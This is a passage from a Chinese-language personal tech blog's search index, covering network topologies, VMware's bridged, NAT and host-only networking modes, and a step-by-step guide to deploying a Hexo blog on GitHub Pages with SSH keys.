alt="环形拓扑"></p><p>实际上大多数情况下这种拓扑结构的网络不会是所有计算机真的要连接成物理上的环型，一般情况下，环的两端是通过一个阻抗匹配器来实现环的封闭的，因为在实际组网过程中因地理位置的限制不方便真的做到环的两端物理连接。</p><p><strong>环型拓扑结构的网络特点如下</strong>：</p><ul><li>信息流在网中是沿着固定方向流动的，两个节点仅有一条道路，故简化了路径选择的控制；</li><li>环路上各节点都是自主控制，故控制软件简单；</li><li>由于信息源在环路中是串行地穿过各个节点，当环中节点过多时，势必影响信息传输速率，使网络的响应时间延长；</li><li>环路是封闭的，不便于扩充；</li><li>可靠性低，一个节点故障，将会造成全网瘫痪；</li><li>维护难，对分支节点故障定位较难。</li></ul><p><strong>环型拓扑结构的结构特点如下</strong>：</p><ul><li>一般仅适用于IEEE 802.5的令牌网(Token ring network)，在这种网络中，”令牌”是在环型连接中依次传递。所用的传输介质一般是同轴电缆。</li><li>网络实现也非常简单，投资最小。可以从其网络结构示意图中看出，组成这个网络除了各工作站就是传输介质–同轴电缆，以及一些连接器材，没有价格昂贵的节点集中设备，如集线器和交换机。但也正因为这样，所以这种网络所能实现的功能最为简单，仅能当作一般的文件服务模式；</li><li>传输速度较快：在令牌网中允许有16Mbps的传输速度，它比普通的10Mbps以太网要快许多。当然随着以太网的广泛应用和以太网技术的发展，以太网的速度也得到了极大提高，目前普遍都能提供100Mbps的网速，远比16Mbps要高。</li><li>维护困难：从其网络结构可以看到，整个网络各节点间是直接串联，这样任何一个节点出了故障都会造成整个网络的中断、瘫痪，维护起来非常不便。另一方面因为同轴电缆所采用的是插针式的接触方式，所以非常容易造成接触不良，网络中断，而且这样查找起来非常困难，这一点相信维护过这种网络的人都会深有体会。</li><li>扩展性能差：也是因为它的环型结构，决定了它的扩展性能远不如星型结构的好，如果要新添加或移动节点，就必须中断整个网络，在环的两端作好连接器才能连接。</li></ul><h3 id="4-树型网络拓扑结构"><a href="#4-树型网络拓扑结构" class="headerlink" title="4.树型网络拓扑结构"></a>4.树型网络拓扑结构</h3><p>树型拓扑结构是一种层次结构，结点按层次连结，信息交换主要在上下结点之间进行，相邻结点或同层结点之间一般不进行数据交换。树型拓扑结构是就是数据结构中的树。树型拓扑结构图如下:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A0%91%E5%BD%A2%E6%8B%93%E6%89%91.png" alt="树形拓扑"></p><p><strong>树形拓扑结构的网络特点如下：</strong></p><ul><li>网络结构简单，便于管理；</li><li>控制简单，建网容易；</li><li>网络延迟时间较短，误码率较低；</li><li>网络共享能力较差；</li><li>通信线路利用率不高；</li><li>中央结点负荷太重。</li></ul><p><strong>树型拓扑结构的结构特点如下</strong>：</p><ul><li>易于扩充。树形结构可以延伸出很多分支和子分支，这些新节点和新分支都能容易地加入网内。</li><li>故障隔离较容易。如果某一分支的节点或线路发生故障，很容易将故障分支与整个系统隔离开来。</li><li>各个节点对根节点的依赖性太大。如果根发生故障，则全网不能正常工作。</li></ul><h3 id="5-网状网络拓扑结构"><a href="#5-网状网络拓扑结构" class="headerlink" title="5.网状网络拓扑结构"></a>5.网状网络拓扑结构</h3><p>网络拓扑结构又称作无规则结构，结点之间的联结是任意的，没有规律。网状拓扑结构图如下:</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%BD%91%E7%8A%B6%E6%8B%93%E6%89%91.png" alt="网状拓扑"></p><p><strong>网状网络拓扑结构的结构特点如下：</strong></p><ul><li>网络可靠性高，一般通信子网中任意两个节点交换机之间，存在着两条或两条以上的通信路径，这样，当一条路径发生故障时，还可以通过另一条路径把信息送至节点交换机。</li><li>网络可组建成各种形状，采用多种通信信道，多种传输速率。</li><li>网内节点共享资源容易。</li><li>可改善线路的信息流量分配。</li><li>可选择最佳路径，传输延迟小。</li></ul><p>网状形网是广域网中最常采用的一种网络形式，是典型的点到点结构。在网状拓扑结构中，网络的每台设备之间均有点到点的链路连接，这种连接不经济，只有每个站点都要频繁发送信息时才使用这种方法。它的安装也复杂，但系统可靠性高，容错能力强。有时也称为分布式结构。</p><h3 id="6-混合网络型拓扑结构"><a href="#6-混合网络型拓扑结构" class="headerlink" title="6.混合网络型拓扑结构"></a>6.混合网络型拓扑结构</h3><p>混合型网络拓扑结构就是指同时使用上面的5种网络拓扑结构种两种或两种以上的网络拓扑结构。</p><p>这种网络拓扑结构是由星型结构和总线型结构的网络结合在一起的网络结构，这样的拓扑结构更能满足较大网络的拓展，解决星型网络在传输距离上的局限，而同时又解决了总线型网络在连接用户数量的限制。这种网络拓扑结构同时兼顾了星型网与总线型网络的优点，在缺点方面得到了一定的弥补。</p><p><strong>混合型网络拓扑结构的结构特点如下：</strong></p><ul><li>应用广泛</li></ul><p>这主要是因它解决了星型和总线型拓扑结构的不足，满足了大公司组网的实际需求。目前在一些智能化的信息大厦中的应用非常普遍。在一幢大厦中，各楼层间采用光纤作为总线传输介质，一方面可以保证网络传输距离，另一方面，光纤的传输性能要远好于同轴电缆， 所以，在传输性能上也给予了充分保证。当然投资成本会有较大增加，在一些较小建筑物中 也可以采用同轴电缆作为总线传输介质。各楼层内部仍普遍采用使用双绞线星型以太网。</p><ul><li>扩展灵活</li></ul><p>这主要是继承了星型拓扑结构的优点。但由于仍采用广播式的消息传送方式，所以在总 线长度和节点数量上也会受到限制，不过在局域网中的影响并不是很大。</p><ul><li>性能差</li></ul><p>因为其骨干网段(总线段)采用总线网络连接方式，所以各楼层和各建筑物之间的网络 互联性能较差，仍局限于最高1 6Mbps的速率。另外，这种结构网络具有总线型网络结构的 弱点，网络速率会随着用户的增多而下降。当然在采用光纤作为传输介质的混合型网络中， 这些影响还是比较小的。</p><ul><li>较难维护</li></ul><p>这主要受到总线型网络拓扑结构的制约，如果总线断，则整个网络也就瘫痪了，但是如果是分支网段出了故障，则不影响整个网络的正常运作。再一个就是整个网络非常复杂，维护起来不容易。</p><p>三层结构模型：接入层、汇聚层、核心层</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E7%BD%91%E7%BB%9C%E7%9A%84%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84.png" alt="网络的层次结构"></p><p>接入层、汇聚层、核心层</p><p>接入层：无线网络发射器，AP（提供接入网络的接口）。接入交换机通常位于机架顶部，所以它们也被称为ToR（Top of Rack）交换机，它们物理连接服务器。</p><p>汇聚层：楼层交换机、建筑物交换机（汇聚接入层设备）。汇聚交换机连接Access交换机，同时提供其他的服务，例如防火墙，SSL offload，入侵检测，网络分析等。</p><p>核心层：核心交换机（数据高速转发）。核心交换机为进出数据中心的包提供高速的转发，为多个汇聚层提供连接性，核心交换机为通常为整个网络提供一个弹性的L3路由网络。</p><h1 id="VMware的三种网络连接模式"><a href="#VMware的三种网络连接模式" class="headerlink" title="VMware的三种网络连接模式"></a>VMware的三种网络连接模式</h1><h3 id="私有地址范围："><a href="#私有地址范围：" class="headerlink" title="私有地址范围："></a>私有地址范围：</h3><p>10.0.0.0-10.255.255.255</p><p>172.16.0.0-172.31.255.255</p><p>192.168.0.0-192.168.255.255</p><p>安装完成vmware以后</p><p>进入虚拟机—&gt;&gt;设置—&gt;&gt;网络适配器</p><p>在网络适配器中可以发现vmware为我们提供了三种网络工作模式，它们分别是：</p><ol><li>Bridged（桥接模式）</li><li>NAT（网络地址转换模式）</li><li>Host-Only（仅主机模式）</li></ol><p>在网络适配器中可以发现vmware为我们提供了三种网络工作模式，它们分别是：</p><ol><li>Bridged（桥接模式）</li><li>NAT（网络地址转换模式）</li><li>Host-Only（仅主机模式）</li></ol><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E6%9C%BA%E8%AE%BE%E7%BD%AE.png" alt="虚拟机设置"></p><p> 打开vmware虚拟机，我们可以在选项栏的<strong>“编辑”</strong>下的<strong>“虚拟网络编辑器”</strong>中看到  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%BC%96%E8%BE%91%E5%99%A8.png" alt="虚拟机编辑器"></p><ul><li>VMnet0表示的是用于桥接模式下的虚拟交换机；</li><li>VMnet1表示的是用于仅主机模式下的虚拟交换机；</li><li>VMnet8表示的是用于NAT模式下的虚拟交换机；</li></ul><p> 同时，在主机上对应的有显示相应的网卡信息</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E4%B8%BB%E6%9C%BA%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF.png" alt="主机网卡信息"></p><h2 id="Bridged（桥接模式）"><a href="#Bridged（桥接模式）" class="headerlink" title="Bridged（桥接模式）"></a>Bridged（桥接模式）</h2><h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p> 什么是桥接模式？桥接模式就是将主机网卡与虚拟机虚拟的网卡利用虚拟网桥进行通信。在桥接的作用下，类似于把物理主机虚拟为一个交换机，所有桥接设置的虚拟机连接到这个交换机的一个接口上，物理主机也同样插在这个交换机当中，所以所有桥接下的网卡与网卡都是交换模式的，相互可以访问而不干扰。在桥接模式下，虚拟机ip地址需要与主机在同一个网段，如果需要联网，则网关与DNS需要与主机网卡一致。  </p><p> 其网络结构如下图所示：  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F.png" alt="桥接模式"></p><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>打开VMware的虚拟网络编辑器，将桥接模式下的虚拟网卡桥接到真实无线网卡或有线网卡。 </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%88%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%89.png" alt="虚拟网络编辑器（桥接模式）"></p><p> 在物理机中通过win+r –&gt;cmd，进入win的命令行界面，输入命令ipconfig查看当前的网络连接信息。 </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%A1%A5%E6%8E%A5%E5%9C%B0%E5%9D%80.png" alt="桥接地址"></p><p>在虚拟机设置中，将网络适配器设置为桥接模式。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E8%99%9A%E6%8B%9F%E7%BD%91%E7%BB%9C%E7%BC%96%E8%BE%91%E5%99%A8%EF%BC%88%E6%A1%A5%E6%8E%A5%E6%A8%A1%E5%BC%8F%EF%BC%89.png" alt="虚拟网络编辑器（桥接模式）"></p><p>进入VMware中的Kali Linux系统，在终端中通过ifconfig查看Kali Linux的网络连接信息。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgKali%20Linux%E7%B3%BB%E7%BB%9F.png" alt="Kali Linux系统"></p><p>以上可以看出，host的ip为192.168.2.87，Kali Linux的ip为192.168.2.61，处于同一网段下。</p><p>此时，虚拟机可以连接外网，可以和同网段的其他真实物理主机之间相互访问呢，可以和相同模式的虚拟机之间相互访问。<strong>此模式用于ip地址资源比较充足的情况</strong></p><p><strong>缺点：</strong></p><p>但如果你的网络环境是ip资源很缺少或对ip管理比较严格的话，那桥接模式就不太适用了。如果真是这种情况的话，我们该如何解决呢？接下来，我们就来认识vmware的另一种网络模式：<strong>NAT模式</strong>。</p><h2 id="NAT（地址转换模式）"><a href="#NAT（地址转换模式）" class="headerlink" title="NAT（地址转换模式）"></a>NAT（地址转换模式）</h2><h3 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h3><p> 刚刚我们说到，如果你的网络ip资源紧缺，但是你又希望你的虚拟机能够联网，这时候NAT模式是最好的选择。NAT模式借助<strong>虚拟NAT设备</strong>和<strong>虚拟DHCP服务器</strong>，使得虚拟机可以联网。其网络结构如下图所示：  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgnat%E6%A8%A1%E5%BC%8F.png" alt="nat模式"></p><p> 在NAT模式中，主机网卡直接与虚拟NAT设备相连，然后虚拟NAT设备与虚拟DHCP服务器一起连接在虚拟交换机VMnet8上，这样就实现了虚拟机联网。那么我们会觉得很奇怪，为什么需要虚拟网卡VMware Network Adapter VMnet8呢？原来我们的VMware Network Adapter VMnet8虚拟网卡主要是为了实现主机与虚拟机之间的通信。在之后的设置步骤中，我们可以加以验证。  </p><h3 id="实现-1"><a href="#实现-1" class="headerlink" title="实现"></a>实现</h3><p>首先，设置虚拟机中NAT模式的选项，打开vmware，点击“编辑”下的“虚拟网络编辑器”，设置NAT参数及DHCP参数。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//imgimg1698714931785-5ef00c52-fbf1-41fb-8b07-cd61ea8f0c05.png" alt="img"></p><p> 第2、3步：设置NAT和DHCP，使得其网段和子网网段一致。并设置网关ip和DHCP地址池范围。（.2用作默认网关和DNS服务器，.1不用作网关的原因是预留给虚拟网卡使用）  </p><p><img src="https://cdn.nlark.com/yuque/0/2023/png/12431291/1698715166496-0f77bd5b-9faa-43bb-bea7-368688e915eb.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698715312550-ad12d973-ff91-44e0-a5b4-9b4892689c40.png" alt="img"></p><p> 第4步：更改网络适配器为NAT模式  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698718185010-c3d8448e-f42a-4735-90c8-3db04de17d66.png" alt="img"></p><p> 进入Kali Linux，查看当前ip在18网段，NAT模式实现成功。  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698718610234-d7d5814b-bcba-4018-9dd3-41d0b04ba3f6.png" alt="img"></p><p> 此时，虚拟机可以连接外网（NAT实现），可以和相同模式的虚拟机之间相互访问（同一交换机下），但不可以和同网段的其他真实物理主机之间相互访问（不同子网，且没有第三层路由器）。此模式用于ip地址资源比较稀缺的情况。  </p><p>然后，将VMware Network Adapter VMnet8启用之后，发现远程工具可以连接上虚拟机了。</p><p>那么，这就是NAT模式，利用虚拟的<strong>NAT设备</strong>以及<strong>虚拟DHCP服务器</strong>来使虚拟机连接外网，而<strong>VMware Network Adapter VMnet8虚拟网卡</strong>是用来与虚拟机通信的。</p><h2 id="Host-Only（仅主机模式）"><a href="#Host-Only（仅主机模式）" class="headerlink" title="Host-Only（仅主机模式）"></a>Host-Only（仅主机模式）</h2><h3 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h3><p>Host-Only模式其实就是<strong>NAT模式</strong>去除了<strong>虚拟NAT设备</strong>，然后使用<strong>VMware Network Adapter VMnet1</strong>虚拟网卡连接<strong>VMnet1虚拟交换机</strong>来与<strong>虚拟机</strong>通信的，Host-Only模式将虚拟机与外网隔开，使得虚拟机成为一个独立的系统，只与主机相互通讯。其网络结构如下图所示：  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698721794018-903405aa-3afb-4d7c-8897-72406868ab58.png" alt="img"></p><h3 id="实现-2"><a href="#实现-2" class="headerlink" title="实现"></a>实现</h3><p>第1步：修改子网ip，不要和host所在子网冲突。（此处，我的host主机网段为1，设置Vmnet1网段为11）。  </p><p>设置“虚拟网络编辑器”，可以设置DHCP的起始范围。</p><h3 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698721995387-a84e97bc-99fc-4af5-a23c-1a9a9f62aef4.png" alt="img"></h3><p> 设置DHCP地址池。  </p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698722057875-ffe0b7bd-a2c1-478d-a870-694c6153f790.png" alt="img"></p><p>设置虚拟机为Host-Only模式。</p><p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img1698722065360-9eb0845b-c4e6-4d21-a98a-75d58846f070.png" alt="img"></p><p> 进入Kali查看设置结果。  </p><h2 id="三种不同模式的区别"><a href="#三种不同模式的区别" class="headerlink" title="三种不同模式的区别"></a>三种不同模式的区别</h2><p>桥接模式相当于是虚拟机作为一台新机器连入局域网中，可以和局域网中的其他机器相互通信。</p><p>nat模式则是虚拟机在外部网络中不必具有自己的IP地址，从外部网络来看，虚拟机和主机在共享一个IP地址，默认情况下，外部网络终端也无法访问到虚拟机。</p><p>仅主机模式在同一台主机上可以创建多个仅主机模式的虚拟网络，如果多个虚拟机处于同一个仅主机模式网络中，那么它们之间是可以相互通信的，如果处于不同的仅主机模式网络中，则默认情况下无法进行相互通信。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>配置虚拟机和使用GitHub写博客</title>
    <link href="/2023/11/07/2023-11-7-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%BD%BF%E7%94%A8GitHub%E5%86%99%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/11/07/2023-11-7-%E9%85%8D%E7%BD%AE%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%92%8C%E4%BD%BF%E7%94%A8GitHub%E5%86%99%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<h3 id="配置虚拟机"><a href="#配置虚拟机" class="headerlink" title="配置虚拟机"></a>配置虚拟机</h3><p>先下载软件__VMware__（此软件是用于使用虚拟机），再将win10的虚拟机<u>（Win10_1903_V2_Chinese(Simplified)_x64.iso）</u></p><p>配置在VMware中。启动虚拟机看是否成功安装。  </p><h3 id="使用GitHub写博客"><a href="#使用GitHub写博客" class="headerlink" title="使用GitHub写博客"></a>使用GitHub写博客</h3><p>下载git、node和Typota三个软件，其中git进行GitHub中博客相关操作，Typota进行编写博客操作。下面进行博客的创建： </p><ol><li>在本地找个目录放博客源文件，路径不要有中文。</li><li>在选定的目录中，右键Git Bash Here，使用npm命令安装Hexo，输入：</li></ol><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span>-g hexo-cli <br>hexo init <span class="hljs-keyword">blog </span><br>cd <span class="hljs-keyword">blog </span><br>hexo g <br></code></pre></td></tr></table></figure><p>创建博客。</p><ol start="3"><li>再进行ssh密钥的配置，使用语句cd ~&#x2F;.ssh用于检查本机是否有ssh密钥（如果提示：No such file or directory 说明你是第一次使用git）。</li><li>使用语句’ssh-keygen -t rsa -C “邮件地址”’，然后连续3次回车，最终会生成一个文件在用户目录下，打开用户目录，找到.ssh\id_rsa.pub文件，记事本打开并复制里面的内容，打开你的github主页，进入个人设置 -&gt; SSH and GPG keys -&gt; New SSH key：写一个ssh密钥的标题，再将“C: \Users\当前用户名.ssh\id_rsa.pub”中的内容复制到key中。</li><li>完成以上操作后测试ssh连接是否成功，使用’ssh -T <a href="mailto:&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#46;&#99;&#111;&#x6d;">&#103;&#105;&#116;&#64;&#x67;&#105;&#116;&#x68;&#x75;&#98;&#46;&#99;&#111;&#x6d;</a>‘（邮箱地址不用改），如果提示Are you sure you want to continue connecting (yes&#x2F;no)?，输入yes，提示“Hi LINF2009! You’ve successfully authenticated, but GitHub does not provide shell access.”则连接成功。最后在选中的位置(blog目录下)打开cmd，输入’npm install hexo-deployer-git –save’，再在上一个Git Bash Here还需要继续配置</li></ol><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs verilog">git <span class="hljs-keyword">config</span> –<span class="hljs-keyword">global</span> user<span class="hljs-variable">.name</span> “xxx”<span class="hljs-comment">// 你的github用户名，非昵称</span><br>git <span class="hljs-keyword">config</span> –<span class="hljs-keyword">global</span> user<span class="hljs-variable">.email</span> “xxx@qq<span class="hljs-variable">.com</span>“<span class="hljs-comment">// 填写你的github注册邮箱</span><br></code></pre></td></tr></table></figure><ol start="6"><li>在GitHub上建立一个存储库，命名为github的用户名.github.io（必须与自己github注册用户名一致，因为Github 仅能使用一个同名仓库的代码托管一个静态站点），编辑_config.yml文件，在最后改成这样</li></ol><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">deploy:</span> <br><span class="hljs-symbol">type:</span> git<br><span class="hljs-symbol">repository:</span> git@github.com:xxx/xxx.github.io.git<br><span class="hljs-symbol">branch:</span> main<br></code></pre></td></tr></table></figure><p>最后上传。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
